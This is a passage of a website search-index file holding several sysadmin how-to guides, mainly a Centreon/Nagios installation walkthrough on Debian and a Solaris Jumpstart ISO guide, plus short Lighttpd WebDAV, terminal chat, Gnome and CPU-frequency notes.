centreon-2.0.2.tar.gz cd centreon-2.0.2 ./install.sh -i And that’s it… the installation has started!!! So, here are the steps one by one (we’ll follow the method step by step in case you have differences):\n############################################################################### # # # Centreon (www.centreon.com) # # Thanks for using Centreon # # # # v2.0.2 # # # # infos@oreon-project.org # # # # Make sure you have installed and configured # # sudo - sed - php - apache - rrdtool - mysql # # # ############################################################################### ------------------------------------------------------------------------ Checking all needed binaries ------------------------------------------------------------------------ rm OK cp OK mv OK /bin/chmod OK /bin/chown OK echo OK more OK mkdir OK find OK /bin/grep OK /bin/cat OK /bin/sed OK You will now read Centreon Licence. Press enter to continue. Press enter, then accept (or not) the GNU license:\nGNU GENERAL PUBLIC LICENSE Version 2, June 1991 Copyright (C) 1989, 1991 Free Software Foundation, Inc. 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is not allowed. Preamble The licenses for most software are designed to take away your .... q Do you accept GPL license? [y/n], default to [n]: Enter y.\n------------------------------------------------------------------------ Please choose what you want to install ------------------------------------------------------------------------ Do you want to install: Centreon Web Front [y/n], default to [n]: Well, the frontend is important, it’s actually the main reason we’re installing it:\n------------------------------------------------------------------------ Please choose what you want to install ------------------------------------------------------------------------ Do you want to install: Centreon Web Front [y/n], default to [n]: So enter y.\nDo you want to install: Centreon CentCore [y/n], default to [n]: For my part, I’ll say yes (y). But you should decide based on your needs. CentCore allows you to have satellites in datacenters or branches, for example, to avoid false alerts in case of line loss between your server and agents (like NRPE or NCSA).\nTo summarize, if you’re going to deploy a large architecture, I recommend it; otherwise, leave it as no.\nNext for Nagios plugins, of course we’ll install them:\nDo you want to install: Centreon Nagios Plugins [y/n], default to [n]: So enter y.\nDo you want to install: Centreon Snmp Traps process [y/n], default to [n]: Again, if you need to receive SNMP traps from your equipment (like Cisco, Alcatel, Brocade, etc.), then activate this; otherwise, it’s not necessary. For me, I need it so I enter y.\nWhere is your Centreon directory? default to [/usr/local/centreon] Do you want me to create this directory? [/usr/local/centreon] [y/n], default to [n]: If the folder suits you, enter y; otherwise, create it and modify the path. I’ll keep it (so y).\nPath /usr/local/centreon OK Where is your Centreon log directory default to [/usr/local/centreon/log] Now, let’s create a proper log directory at /var/log/centreon:\n\u003e /var/log/centreon Do you want me to create this directory? [/var/log/centreon] [y/n], default to [n]: \u003e y Path /var/log/centreon OK Now, the configuration files. The default location is just fine:\nWhere is your Centreon etc directory default to [/etc/centreon] That’s perfect, so press ’enter'.\nDo you want me to create this directory? [/etc/centreon] [y/n], default to [n]: \u003e y Path /etc/centreon OK And yes, it will create it (y).\nPS: If you’re getting tired, you can take a break; it’s still a bit long.\nWhere is your Centreon generation_files directory? default to [/usr/local/centreon] Path /usr/local/centreon OK This looks good to me (enter).\nWhere is your Centreon variable library directory? default to [/var/lib/centreon] \u003e Directory /var/lib/centreon does not exists. CRITICAL Where is your Centreon variable library directory? default to [/var/lib/centreon] \u003e Do you want me to create this directory? [/var/lib/centreon] [y/n], default to [n]: \u003e y Path /var/lib/centreon OK We validate again.\nWhere is the RRD perl module installed [RRDs.pm] default to [/usr/lib/perl5/RRDs.pm] Path /usr/lib/perl5 OK /usr/bin/rrdtool OK /usr/bin/mail OK Great, the paths are correct, we validate. And for PEAR?\nWhere is PEAR [PEAR.php] default to [/usr/share/php/PEAR.php] Path /usr/share/php OK Great, it’s correct again… we’re lucky! Shall we continue?\nWhere is installed Nagios? default to [/usr/local/nagios] This is wrong! Since we installed nagios via Debian repositories, not via source, the path is incorrect. The correct path is /usr/share/nagios3:\n/usr/share/nagios3 Path /usr/share/nagios3 OK Where is your nagios config directory default to [/usr/local/nagios/etc] Here we’ll enter /etc/nagios3:\nWhere is your nagios config directory default to [/usr/local/nagios/etc] /etc/nagios3 Path /etc/nagios3 OK Let’s enter /var/log/nagios3 here, which will contain the nagios.log file:\nWhere is your Nagios var directory? default to [/usr/local/nagios/var] /var/log/nagios3 Path /var OK The directory below is supposed to contain all the plugins. We’ll enter /usr/lib/nagios/plugins:\nWhere is your Nagios plugins (libexec) directory? default to [/usr/local/nagios/libexec] /usr/lib/nagios/plugins Path /lib OK /usr/sbin/nagios3 OK Now, the location of the logos that we’ll change to /usr/share/nagios3/htdocs/images/logos:\nWhere is your Nagios image directory? default to [/usr/local/nagios/share/images/logos] /usr/share/nagios3/htdocs/images/logos Path /usr/share/nagios3/htdocs/images/logos OK /usr/sbin/nagios3stats OK p1_file: /usr/lib/nagios3/p1.pl OK /usr/bin/php OK /usr/bin/perl OK For CentPlugins, we’ll leave everything at default and let it create the directory:\nWhere is your CentPlugins Traps binary default to [/usr/local/centreon/bin] Do you want me to create this directory? [/usr/local/centreon/bin] [y/n], default to [n]: Path /usr/local/centreon/bin OK Finding Apache group: www-data Finding Apache user: www-data Finding Nagios user: nagios Finding Nagios group: nagios For the ndo library, it’s /usr/lib/ndoutils/ndomod-mysql-3x.o:\nWhere is your NDO ndomod binary? default to [/usr/sbin/ndomod.o] /usr/lib/ndoutils/ndomod-mysql-3x.o /usr/lib/ndoutils/ndomod-mysql-3x.o OK Now, for sudo configuration, everything is good by default, we don’t touch anything, it does everything automatically:\n------------------------------------------------------------------------ Configure Sudo ------------------------------------------------------------------------ Where is sudo configuration file default to [/etc/sudoers] /etc/sudoers OK Nagios init script OK Your sudo is not configured Do you want me to configure your sudo? (WARNING) [y/n], default to [n]: \u003e y Configuring Sudo OK Now comes the time for Apache. It offers to make the configuration for us (great):\n------------------------------------------------------------------------ Configure Apache server ------------------------------------------------------------------------ Do you want to add Centreon Apache sub configuration file? [y/n], default to [n]: So enter y, to reload the configuration and finally check the modules (y):\nDo you want to reload your Apache? [y/n], default to [n]: Reloading Apache service OK Preparing Centreon temporary files Change right on /var/log/centreon OK Change right on /etc/centreon OK Change right on /usr/share/nagios3/htdocs/images/logos OK Install nagios documentation OK Change macros for insertBaseConf.sql OK Change macros for php files Change macros for php files OK Change right on /etc/nagios3 OK Copy CentWeb in system directory Install CentWeb (web front of centreon) OK Install libraries OK Change macros for centreon.cron OK Install Centreon cron.d file OK Change macros for archiveDayLog OK Change macros for centAcl.php OK Install cron directory OK Pear Modules Check PEAR modules PEAR 1.5.0 1.7.1 OK DB 1.7.6 NOK DB_DataObject 1.8.4 NOK DB_DataObject_FormBuilder 1.0.0RC4 NOK MDB2 2.0.0 NOK Date 1.4.6 NOK HTML_Common 1.2.2 NOK HTML_QuickForm 3.2.5 NOK HTML_QuickForm_advmultiselect 1.1.0 NOK HTML_Table 1.6.1 NOK Archive_Tar 1.1 1.3.2 OK Auth_SASL 1.0.1 NOK Console_Getopt 1.2 1.2.3 OK Net_SMTP 1.2.8 NOK Net_Socket 1.0.1 NOK Net_Traceroute 0.21 NOK Net_Ping 2.4.1 NOK Validate 0.6.2 NOK XML_RPC 1.4.5 NOK SOAP 0.10.1 NOK Log 1.9.11 NOK Since there are not many PHP modules (PEAR) installed, and since it’s helpful, we’ll tell it to install and upgrade the missing modules (y):\nDo you want me to install/upgrade your PEAR modules [y/n], default to [y]: Upgrading PEAR modules Installing PEAR modules DB 1.7.6 1.7.13 OK DB_DataObject 1.8.4 1.8.10 OK DB_DataObject_FormBuilder 1.0.0RC4 1.0.0RC7 OK MDB2 2.0.0 2.4.1 OK HTML_QuickForm_advmultiselect 1.1.0 1.5.1 OK HTML_Table 1.6.1 1.8.2 OK Auth_SASL 1.0.1 1.0.2 OK Net_SMTP 1.2.8 1.3.2 OK Net_Traceroute 0.21 0.21.1 OK Net_Ping 2.4.1 2.4.4 OK Validate 0.6.2 0.8.2 OK XML_RPC 1.4.5 1.5.1 OK SOAP 0.10.1 0.12.0 OK Log 1.9.11 1.11.4 OK Check PEAR modules PEAR 1.5.0 1.7.1 OK DB 1.7.6 1.7.13 OK DB_DataObject 1.8.4 1.8.10 OK DB_DataObject_FormBuilder 1.0.0RC4 1.0.0RC7 OK MDB2 2.0.0 2.4.1 OK Date 1.4.6 1.4.7 OK HTML_Common 1.2.2 1.2.5 OK HTML_QuickForm 3.2.5 3.2.11 OK HTML_QuickForm_advmultiselect 1.1.0 1.5.1 OK HTML_Table 1.6.1 1.8.2 OK Archive_Tar 1.1 1.3.2 OK Auth_SASL 1.0.1 1.0.2 OK Console_Getopt 1.2 1.2.3 OK Net_SMTP 1.2.8 1.3.2 OK Net_Socket 1.0.1 1.0.9 OK Net_Traceroute 0.21 0.21.1 OK Net_Ping 2.4.1 2.4.4 OK Validate 0.6.2 0.8.2 OK XML_RPC 1.4.5 1.5.1 OK SOAP 0.10.1 0.12.0 OK Log 1.9.11 1.11.4 OK All PEAR modules OK ------------------------------------------------------------------------ Centreon Post Install ------------------------------------------------------------------------ Create /usr/local/centreon/www/install/install.conf.php OK Create /etc/centreon/instCentWeb.conf OK Now, CentStorage will be installed and is called ODS (Oreon Data Storage). It allows us to archive RRD graphs in MySQL.\n------------------------------------------------------------------------ Start CentStorage Installation ------------------------------------------------------------------------ Where is your Centreon Run Dir directory? default to [/var/run/centreon] We’ll let it create everything (y):\nDo you want me to create this directory? [/var/run/centreon] [y/n], default to [n]: Path /var/run/centreon OK We’ll leave everything as is (as usual).\nWhere is your CentStorage binary directory default to [/usr/local/centreon/bin] Path /usr/local/centreon/bin OK Again, we don’t change anything.\nWhere is your CentStorage RRD directory default to [/var/lib/centreon] Path /var/lib/centreon OK Finding Nagios group: nagios Finding Nagios user: nagios Preparing Centreon temporary files /tmp/centreon-setup exists, it will be moved... install www/install/createTablesCentstorage.sql OK Creating Centreon Directory '/var/lib/centreon/status' OK Creating Centreon Directory '/var/lib/centreon/metrics' OK Change macros for centstorage binary OK Install CentStorage binary OK Install library for centstorage OK Change right: /var/run/centreon OK Change macros for centstorage init script OK All that’s left is to install the runlevel scripts, so y as usual:\nDo you want me to install CentStorage init script? [y/n], default to [n]: CentStorage init script installed OK Do you want me to install CentStorage run level? [y/n], default to [n]: update-rc.d: warning: /etc/init.d/centstorage missing LSB information update-rc.d: see Adding system startup for /etc/init.d/centstorage ... /etc/rc0.d/K30centstorage -\u003e ../init.d/centstorage /etc/rc1.d/K30centstorage -\u003e ../init.d/centstorage /etc/rc6.d/K30centstorage -\u003e ../init.d/centstorage /etc/rc2.d/S40centstorage -\u003e ../init.d/centstorage /etc/rc3.d/S40centstorage -\u003e ../init.d/centstorage /etc/rc4.d/S40centstorage -\u003e ../init.d/centstorage /etc/rc5.d/S40centstorage -\u003e ../init.d/centstorage Change macros for logAnalyser OK Install logAnalyser OK Change macros for nagiosPerfTrace OK Install nagiosPerfTrace OK Change macros for centstorage.cron OK Install CentStorage cron OK Create /etc/centreon/instCentStorage.conf OK Now we’re approaching the end with the installation of CentCore:\n------------------------------------------------------------------------ Start CentCore Installation ------------------------------------------------------------------------ Where is your CentCore binary directory default to [/usr/local/centreon/bin] We’ll leave the default, which is fine:\nPath /usr/local/centreon/bin OK /usr/bin/ssh OK /usr/bin/scp OK Finding Nagios group: nagios Finding Nagios user: nagios Preparing Centreon temporary files /tmp/centreon-setup exists, it will be moved... Change CentCore Macro OK Copy CentCore in binary directory OK Change right: /var/run/centreon OK Change right: /var/lib/centreon OK Replace CentCore init script Macro OK And then we’ll let it create the runlevel scripts again (y):\nDo you want me to install CentCore init script? [y/n], default to [n]: CentCore init script installed OK Do you want me to install CentCore run level? [y/n], default to [n]: update-rc.d: warning: /etc/init.d/centcore missing LSB information update-rc.d: see Adding system startup for /etc/init.d/centcore ... /etc/rc0.d/K30centcore -\u003e ../init.d/centcore /etc/rc1.d/K30centcore -\u003e ../init.d/centcore /etc/rc6.d/K30centcore -\u003e ../init.d/centcore /etc/rc2.d/S40centcore -\u003e ../init.d/centcore /etc/rc3.d/S40centcore -\u003e ../init.d/centcore /etc/rc4.d/S40centcore -\u003e ../init.d/centcore /etc/rc5.d/S40centcore -\u003e ../init.d/centcore Create /etc/centreon/instCentCore.conf OK Let’s move on to CentPlugins. The default folder is also good (y):\n------------------------------------------------------------------------ Start CentPlugins Installation ------------------------------------------------------------------------ Where is your CentPlugins lib directory default to [/var/lib/centreon/centplugins] And it will create all that like a champ (y):\nDo you want me to create this directory? [/var/lib/centreon/centplugins] [y/n], default to [n]: Path /var/lib/centreon/centplugins OK Finding Nagios user: nagios Finding Nagios group: nagios Preparing Centreon temporary files /tmp/centreon-setup exists, it will be moved... Change macros for CentPlugins OK Installing the plugins OK Change right on centreon.conf OK CentPlugins is installed For those who wanted SNMP traps, SNMP must be installed, then validate everything else (y):\n------------------------------------------------------------------------ Start CentPlugins Traps Installation ------------------------------------------------------------------------ Where is your SNMP configuration directory default to [/etc/snmp] /etc/snmp OK Where is your SNMPTT binaries directory default to [/usr/local/centreon/bin/] /usr/local/centreon/bin/ OK Finding Nagios group: nagios Finding Apache user: www-data Preparing Centreon temporary files /tmp/centreon-setup exists, it will be moved... Change macros for CentPluginsTraps OK Installing the plugins Trap binaries OK Backup all your snmp files OK Change macros for snmptrapd.conf OK Change macros for snmptt.ini OK Install: snmptrapd.conf OK Install: snmp.conf OK Install: snmptt.ini OK Install: snmptt OK Install: snmpttconvertmib OK Create /etc/centreon/instCentPlugins.conf OK ############################################################################### # # # Go to the URL: http://your-server/centreon/ # # to finish the setup # # # # Report bugs at http://trac.centreon.com # # # # Thanks for using Centreon. # # ----------------------- # # Contact: infos@centreon.com # # http://www.centreon.com # # # ############################################################################### Done!!! We thought it would never end! If their script could do auto-detection, we would save time. And if it was packaged, it would be even better! But well, it’s their livelihood! It’s already free; we shouldn’t complain too much!\nLet’s restart the Apache service and proceed:\n/etc/init.d/apache2 restart Configuration linkCentreon linkWe can now move on to the graphical interface! First, let’s set the correct permissions on the nagios3 folder:\nchown -Rf nagios:www-data /etc/nagios3 chmod -Rf 775 /etc/nagios3 Now, let’s connect to http://your-server/centreon and start the installation:\nEverything should be good so far.\nAdjust the values for your database.\nSpecify the user who will be the Centreon admin.\nFor my part, I chose to have my users connect via LDAP, so I configure my OpenLDAP parameters below.\nAll is good, the installation is complete :-)\nNagios linkNow, let’s move on to configuration. Go to Configuration -\u003e Nagios -\u003e nagios.cfg and modify the following lines:\nLog file: /var/log/nagios3/nagios.log Downtime File: /var/cache/nagios3/downtime.log Comment File: /var/cache/nagios3/comment.log Temp File: /var/cache/nagios3/nagios.tmp Lock File: /var/cache/nagios3/nagios.lock Status File: /var/log/nagios3/status.log External Command File: /var/lib/nagios3/rw/nagios.cmd Go to Configuration -\u003e Nagios -\u003e nagios.cfg -\u003e Data and modify the following lines:\nService Performance Data File: /usr/lib/nagios/plugins/process-service-perfdata Go to Configuration -\u003e Nagios -\u003e cgi -\u003e Cgi.cfg and modify the following lines:\nURL HTML Path: /nagios3 Nagios Process Check Command: /usr/lib/nagios/plugins/check_nagios /var/log/nagios3/status.log 5 '/usr/sbin/nagios3' Save and then run this command:\nchown nagios. /usr/lib/nagios/plugins/process-service-perfdata ndo2db link First, let’s set the basic parameters. Take your beautiful graphical interface and go to: Configuration -\u003e Centreon -\u003e ndo2db.cfg -\u003e Main, then modify this: Socket Type: unix Socket Name: /var/cache/nagios3/ndo.sock Now go to Configuration -\u003e Centreon -\u003e ndo2db.cfg -\u003e Main -\u003e Database and adapt it to your configuration. For my part, I had to change the following fields: Database Name: ndoutils User: ndoutils Password: password Set the password you want and save. Then do the same for this user at the SQL level:\nmysql -uroot -p SET PASSWORD FOR 'ndoutils'@'localhost' = PASSWORD('password'); FLUSH PRIVILEGES; ndomod linkLet’s go to Configuration -\u003e Centreon -\u003e ndo2db.cfg and modify these parameters:\nInstance Name: default Interface Type: unixsocket Output: /var/cache/nagios3/ndo.sock Buffer File: /var/cache/nagios3/ndomod.tmp Then save and restart the service:\n/etc/init.d/ndoutils restart CentStorage linkNow we need to configure CentStorage which will allow us to create beautiful graphs. To do this, go to Administration -\u003e Options -\u003e CentStorage -\u003e Options, then modify the following:\nPerfdata: /usr/lib/nagios/plugins/process-service-perfdata Drop file: /var/lib/centreon/service-perfdata.tmp Nagios current log file to parse: /var/log/nagios3/nagios.log We’ll also set permissions on the logs directory, otherwise centstorage won’t be able to create its logs:\nchown -Rf nagios. /var/log/centreon Then let’s restart CentStorage:\n/etc/init.d/centstorage restart Languages linkPhpSysInfo linkFor those who don’t know, PhpSysInfo is integrated into Centreon (they’re right, why reinvent the wheel). To make some nice tweaks, here’s the config file:\n$default_template='aq'; $loadbar = true; This gives us an aqua theme (like Mac OS X) and a system load bar, which is nice. You can also configure other info about disk temperature, etc… I invite you to check out the official documentation.\nEnabling the Nagios Web Interface linkWe’ll enable this interface for 2 reasons:\nBasic file permissions Having a backup interface Let’s create the file (unless it already exists) /etc/nagios3/htpasswd.users by directly adding a nagios user to it. For this, we’ll use the htpasswd command:\nhtpasswd -c /etc/nagios3/htpasswd.users nagiosadmin Set a password. If you need to add other users, do the same without the “-c”, for example:\nhtpasswd /etc/nagios3/htpasswd.users deimos Then reload your Apache config. Next, you’ll need to modify the Centreon configuration by going to Configuration -\u003e Nagios -\u003e cgi, and replacing nagiosadmin with the nagios user. Then reload your Nagios config from Centreon.\nFAQ linkConnection Error to NDO DataBase! linkThis is due to the packaged installation of Debian! It’s not much to fix.\nLook above, the answer is there.\nmovement KO linkIf you have these types of errors when loading your Nagios config from Centreon, it’s either a permission problem or an NDOutils problem. Make sure you’ve followed the procedure described above.\nWarning: File ‘/var/lib/centreon/service-perfdata’ could not be opened - service performance data will not be written to file! linkIf this happens in the nagios logs, don’t panic, just reset the permissions:\nchown nagios. /var/lib/centreon/service-perfdata Then restart nagios!\nDB Error linkYou might have a message like this in the centAcl.log file:\nDB Error: DELETE FROM `centreon_acl` WHERE `group_id` = '14' [nativecode=1146 ** Table 'ndoutils.centreon_acl' doesn't exist] This means the ‘centreon_acl’ table is missing. Let’s create it:\nmysql -uroot -p use ndoutils; CREATE TABLE IF NOT EXISTS `centreon_acl` ( `id` int(11) NOT NULL auto_increment, `host_name` varchar(255) default NULL, `service_description` varchar(255) default NULL, `group_id` int(11) default NULL, PRIMARY KEY (`id`), KEY `host_name` (`host_name`), KEY `service_description` (`service_description`), KEY `group_id` (`group_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; quit; I don’t have graphs, no errors linkA small reboot would be good. I know we’re not on Windows, but there are so many services around Centreon that a small reboot would help all these services start correctly and reset certain things.\nFrom Centreon my Nagios export works without errors, yet I don’t see my new services appearing linkThis is due to the CGI user not matching. It’s true that a test is missing here that could validate the permissions. In the meantime, it’s quite blocking; I advise you to check out enabling the Nagios web interface to solve your problem.\nReferences linkhttp://en.doc.centreon.com/Main_Page/fr\nhttp://forum.centreon.com/showthread.php?p=48384#post48384\n"
            }
        );
    index.add(
            {
                id:  526 ,
                href: "\/Jumpstart:_automatiser_les_installations_Solaris_sans_r%C3%A9seaux\/",
                title: "Jumpstart: Automating Solaris Installations Without Networks",
                description: "A guide on how to automate Solaris installations using Jumpstart without requiring network infrastructure.",
                content: "Introduction linkFor my job, I had to automate Solaris installations. Jumpstart exists for this purpose. The problem is that in a new datacenter, you don’t always have what you need. That’s the real issue. That’s why I researched documentation on the internet, which often doesn’t work properly, and I’ll try to create a comprehensible guide that works (hopefully).\nPrerequisites linkYou’ll need a fresh Solaris installation on which you’ll do minimal configuration. Also install anything else you’re interested in.\nNote: For now, forget about the ZFS root version and use UFS. There is no clean method for doing a flash install with ZFS.\nYou’ll also need the SUNWmkcd package to have the mkisofs command.\nCreating the Flar linkWe’ll create a flar image which will make an archive of the current system:\nmkdir -p /export/home/sol10jumpstart flarcreate -n sol10_jumpstart -c /export/home/sol10jumpstart/sol10_auto.flar Copying the DVD linkWe’ll copy the DVD content to make necessary modifications:\ncp -Rf /cdrom/cdrom0 /export/home/dvd rm -Rf /export/home/dvd/Solaris_10/Product x86.miniroot linkUnpack linkHere we’ll unpack x86.miniroot to modify its content:\n/boot/solaris/bin/root_archive unpack /export/home/dvd/boot/x86.miniroot /var/tmp/miniroot Jumpstart CDROM linkNow, to address a small issue, we’ll edit this file and you should comment out these 2 lines:\n(/var/tmp/miniroot/usr/sbin/install.d/profind)\n# Factory JumpStart (default) profile search # Arguments: none # cdrom() { # Factory JumpStart is only allowed with factory # stub images, indicated by the file /tmp/.preinstall # #if [ -f /tmp/.preinstall ]; then mount -o ro -F lofs ${CD_CONFIG_DIR} ${SI_CONFIG_DIR} \u003e/dev/null 2\u003e\u00261 if [ $? -eq 0 ]; then verify_config \"CDROM\" fi #fi } sysidcfg linkHere’s probably the most interesting file for setting up your jumpstart. But first, we need to remove the existing symbolic link that would prevent jumpstart from working properly:\nrm /var/tmp/miniroot/etc/sysidcfg Now, let’s create a new file with this content:\n(/var/tmp/miniroot/etc/sysidcfg)\ntimezone=UTC timeserver=localhost name_service=NONE network_interface=primary { netmask=255.255.255.0 protocol_ipv6=no default_route=NONE } nfs4_domain=dynamic security_policy=NONE #keyboard=US-English system_locale=en_US terminal=vt100 root_password=REPLACE_WITH_YOU_OWN For the password, you need to get the encrypted version from /etc/shadow for example. Here’s another example:\n(/var/tmp/miniroot/etc/sysidcfg)\nname_service=none root_password=TITJXNq6L24dw network_interface=none security_policy=none system_locale=C terminal=vt100 timeserver=localhost And here’s another example:\n(/var/tmp/miniroot/etc/sysidcfg)\nname_service=none timezone=UTC timeserver=localhost root_password=OngWELbxoVfUU network_interface=nge0 {hostname=installtemp default_route=1.1.1.2 ip_address =1.1.1.3 netmask=255.255.0.0 protocol_ipv6=no} nfs4_domain=dynamic security_policy=none system_locale=C terminal=vt100 timeserver=localhost Pack linkNow we’ll repackage everything:\n/var/tmp/miniroot/boot/solaris/bin/root_archive pack /export/home/dvd/boot/x86.miniroot /var/tmp/miniroot Moving the flar linkLet’s move the flar to the folder containing the Solaris DVD with the latest modifications we’ve made:\nmv /export/home/sol10jumpstart/sol10_auto.flar /export/home/dvd Customizing the Jumpstart linkWe’ll now choose the automations we want to implement:\ncd /export/home/dvd rm -Rf .install_config mkdir .install_config cd .install_config any_profile link(any_profile)\ninstall_type flash_install archive_location local_file /cdrom/sol10_auto.flar fdisk all solaris all partitioning explicit filesys rootdisk.s0 20480 / filesys rootdisk.s1 4096 swap filesys rootdisk.s3 10240 /var filesys rootdisk.s4 1024 /globaldevices filesys rootdisk.s7 free /export/home begin link(begin)\n#!/bin/sh echo \"Begining ISO FLAR based jumpstart.\" finish link(finish)\n#!/bin/sh ROOTDIR=${ROOTDIR:-/a} #echo \"Finish script for Jumpstart FINISH\" #echo \"Get rid of the nfs prompt\" touch ${ROOTDIR}/etc/.NFS4inst_state.domain # TODO: keep exit status, return it, use the first error encountered. rules link(rules)\nprobe rootdisk probe disks probe karch probe memsize probe model probe hostname any - begin any_profile finish Then, we need to verify the entire configuration. Fortunately, a small tool exists (this command is required):\n/export/home/dvd/Solaris_10/Misc/jumpstart_sample/check Grub linkWe’ll edit the boot menu. Add these lines (they should be placed at the beginning of the title section):\n(/export/home/dvd/boot/grub/menu.lst)\ntitle Solaris 10 Jumpstart kernel /boot/multiboot kernel/unix - install w -B install_media=cdrom module /boot/x86.miniroot Creating the ISO File linkAll that’s left is to create the ISO file with everything we’ve done:\ncd /export/home/dvd/ mkisofs -b boot/grub/stage2_eltorito -c .catalog -no-emul-boot -boot-load-size 4 -boot-info-table -relaxed-filenames -l -ldots -r -N -d -D -V SOL10JUMPSTART -o /export/home/mysol10u6x86.iso . Now all you need to do is burn it and boot from it :-)\nFAQ link/export/home/dvd/boot/x86.miniroot: override protection 444 linkIf you get this error, copy the DVD content to a folder and try your command again (generally):\n/boot/solaris/bin/root_archive pack /export/home/sol_10_1008_x86/boot/x86.miniroot /var/tmp/miniroot References link http://wikis.sun.com/display/BigAdmin/Creating+a+bootable+ISO+image http://run.tournament.org.il/tag/flar/ http://docs.sun.com/app/docs/doc/819-5776/6n7r9js2j?a=view http://www.sun.com/bigadmin/features/articles/jumpstart_x86_x64.jsp http://forums.sun.com/thread.jspa?threadID=5372582\u0026tstart=0 http://amorin.org/professional/jumpstart.php http://docs.sun.com/app/docs/doc/820-2315/ggsez?l=fr\u0026a=view http://www.eng.auburn.edu/~doug/howtos/multipathing.html "
            }
        );
    index.add(
            {
                id:  527 ,
                href: "\/Webdav_avec_Lighttpd\/",
                title: "WebDAV with Lighttpd",
                description: "A guide on how to set up WebDAV with Lighttpd server for uploading files to a web server.",
                content: "Introduction linkWebDAV is great once you’ve tried it. We’ll see how to set it up with Lighttpd. I need it to upload images for my photo album.\nInstallation linkFor the installation, it’s straightforward:\napt-get install lighttpd-mod-webdav Configuration linkLighttpd linkLet’s enable our newly installed module:\nlighty-enable-mod auth lighty-enable-mod webdav Edit the Lighttpd configuration file and uncomment this section:\nserver.modules = ( ... \"mod_webdav\", ... ) We’ll add the folder we want to have WebDAV access to below.\nIf you want to restrict by IP, use this example (/etc/lighttpd/lighttpd.conf): ... $HTTP[\"host\"] =~ \"^webdav\\.(deimos\\.fr)\" { server.document-root = \"/var/www/photos/galleries\" alias.url = ( \"(.*)\" =\u003e \"/var/www/photos/galleries\" ) $HTTP[\"remoteip\"] != \"192.168.0.0/24\" { webdav.activate = \"enable\" webdav.is-readonly = \"disable\" auth.backend = \"htpasswd\" auth.backend.htpasswd.userfile = \"/var/www/photos/galleries/.htpasswd\" auth.require = ( \"\" =\u003e ( \"method\" =\u003e \"basic\", \"realm\" =\u003e \"webdav\", \"require\" =\u003e \"valid-user\" ) ) } } ... If you prefer something simpler, use this example (/etc/lighttpd/lighttpd.conf): $[\"remoteip\"] == \"^webdav\\.(deimos\\.fr)\" { alias.url += ( \"/webdav\" =\u003e \"/var/www/photos/galleries\" ) $HTTP[\"url\"] =~ \"^webdav($|/)\" { dir-listing.activate = \"enable\" webdav.activate = \"enable\" webdav.is-readonly = \"disable\" auth.backend = \"htpasswd\" auth.backend.htpasswd.userfile = \"/var/www/photos/galleries/.htpasswd\" auth.require = (\"\" =\u003e \"method\" =\u003e \"basic\", \"realm\" =\u003e \"webdav\", \"require\" =\u003e \"valid-user\" ) ) } } Finally, restart Lighttpd.\nOf course, if you want to go a bit further with all this, you can also connect it to an LDAP directory, for example.\nWebDAV linkNow let’s configure the file we’re interested in (here /var/www/photos). First, we’ll create an htpasswd file:\nhtpasswd -c /var/www/photos/galleries/.htpasswd www-data I deliberately chose www-data here. But it’s preferable to use a specific user. Let’s also set the correct permissions:\nchown www-data. /var/www/photos/galleries/.htpasswd Resources linkHow To Set Up WebDAV With Lighttpd\n"
            }
        );
    index.add(
            {
                id:  528 ,
                href: "\/Chatter_avec_les_personnes_connect%C3%A9_sur_une_m%C3%AAme_machine_via_terminal\/",
                title: "Chat with Users on the Same Machine via Terminal",
                description: "Learn how to communicate with other users logged into the same Linux or Unix system using terminal commands like write and wall.",
                content: "Introduction linkI’ve been looking several times for a way to chat with other people connected to the same machine as me. And since I’m tired of searching every time how to do it, I’m noting the solutions I found here.\nSolutions linkChat with a single user linkUse the write command:\nwrite user_you_want_to_talk_to Then type your message and press Enter to validate.\nChat with all connected users linkUse the wall command:\necho \"My message\" | wall "
            }
        );
    index.add(
            {
                id:  529 ,
                href: "\/Gnome_:_Tableaux_de_bord_verrouill%C3%A9s\/",
                title: "Gnome: Locked Dashboards",
                description: "How to lock Gnome dashboards to prevent panels and applet icons from moving around accidentally.",
                content: "Introduction linkIn Gnome, dashboard panels and applet icons are so movable that they tend to move around and wander everywhere.\nWhile this option is certainly very flexible, it quickly becomes annoying in daily use. The solution: lock the dashboards!\nGnome includes many configuration tools that allow each user to perfect and control their work environment. One of the most interesting tools is the Configuration Editor, gconf-editor. Warning: gconf-editor is for advanced users. If you don’t understand what you’re doing, don’t touch everything! You could break things!\nImplementation linkLaunch the gconf-editor command from a terminal.\nIn the left panel, open the “apps” directory, then the “panel” directory, and finally “global”. Then, in the right part of the window, look for the “locked_down” line and check the box next to it. That’s it.\nResources linkhttps://ubunteros.tuxfamily.org/spip.php?article210\n"
            }
        );
    index.add(
            {
                id:  530 ,
                href: "\/Modifier_la_fr%C3%A9quence_de_son_processeur\/",
                title: "Modifying CPU Frequency",
                description: "How to modify CPU frequency to save power and reduce fan noise on your computer",
                content: "Introduction linkSo, you have an irritatingly loud CPU fan which is making you consider whether or not launching your laptop through the nearest window is a good idea. And you want to save the planet too! Well, before you do that, why not give CPU frequency scaling a go. Look at laptop mode!\nInstallation linkYou’ll need to install the package:\napt-get install laptop-mode-tools If you’re on ubuntu, you can look at ubuntu-laptop-mode package.\nConfiguration linkModify this line to 1 to always activate laptop mode (/etc/laptop-mode/laptop-mode.conf):\nENABLE_LAPTOP_MODE_ON_AC=1 Then you also can modify this line to autoadapt the CPU with your needs (/etc/laptop-mode/conf.d/cpufreq.conf):\nCONTROL_CPU_FREQUENCY=1 After restart the service:\n/etc/init.d/laptop-mode restart Advanced Configuration linkLoading Module linkOK, first of all, roll up your sleeves and insert the p4_clockmod module:\nsudo modprobe p4_clockmod This shouldn’t return any output.\nNow, add the line (/etc/modules):\np4_clockmod to ensure the CPU clock scaling module starts with the system.\nCPU frequency scaling monitor linkNow, to add the CPU frequency scaling monitor applet to the panel, right click over an empty area in the panel, select ‘add to panel’, and select the CPU frequency applet. Hopefully it’ll pop up showing the CPU frequency now. Reboot your laptop if it doesn’t seem to be working immediately.\nSet frequency linkFinally, if you (like I did) get miffed off with the laptop ’lagging’ when needing a quick boost of power, you can manually set the frequency you want it to run at. Sometimes 250Mhz just isn’t enough!\nsudo cpufreq-selector -f 1000000 Would set the CPU frequency to 1GHz - Easy eh?\nThere you have it, CPU frequency scaling in 5 minutes and a good deal cheaper than lobbing your computer through a window!\n"
            }
        );
    index.add(
            {
                id:  531 ,
                href: "\/Domaines_Virtuels\/",
                title: "Virtual Domains",
